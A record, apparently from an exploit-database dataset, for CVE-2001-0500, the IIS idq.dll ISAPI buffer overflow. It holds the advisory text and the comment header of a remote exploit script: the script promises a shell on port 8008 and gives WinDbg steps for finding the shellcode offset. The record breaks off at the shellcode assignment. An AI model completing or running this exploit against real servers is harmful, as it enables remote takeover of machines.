    "text": "ecve : CVE-2001-0500 ， title : Microsoft Index Server 2.0 / Indexing Service ( Windows 2000 ) - ISAPI Extension Buffer Overflow ( 3 ) - Windows remote Exploit ， verified : Verified ， exploit_detail :  # source :  ，  # Windows Index Server ships with Windows NT 4.0 Option Pack ; Windows Indexing Service ships with Windows 2000. An unchecked buffer resides in the 'idq.dll' ISAPI extension associated with each service. A maliciously crafted request could allow arbitrary code to run on the host in the Local System context. ，  # Note that Index Server and Indexing Service do not need to be running for an attacker to exploit this issue. Since 'idq.dll' is installed by default when IIS is installed , IIS would need to be the only service running. ，  # Note also that this vulnerability is currently being exploited by the 'Code Red' worm. In addition , all products that run affected versions of IIS are also vulnerable. ，  #  ! /bin/sh ，  # .ida nasty exploit ，  # mat @ hacksware.com , mat @ monkey.org ，  # If this exploit succeeds , you can get into the machine through port 8008 ，  # shellcode generated by DeepZone generator ，  # I only tested this code under W2k Korean Version , so the offset value may vary through systems , you can get the offset value with WinDbg tool included in Windows SDK ，  # How to get the offset :  ，  # 1. start windbg and attach to inetinfo.exe process. and go ( F5 )  ，  # 2. using this script attack the test machine ，  # 3. if the offset in this script is not valid , then inetinfo.exe will be got break. ，  # 4. you can search the shellcode position with following command ，  # s 10000 Lfffff 0x68 0x5e 0x56 0xc3 0x90 ，  # 5. if the shellcode position is 0xaabbccdd ，  # then you can change the %u...%u...to %uccdd%uaabb ， target= $ 1 ， SHELLCODE=`",
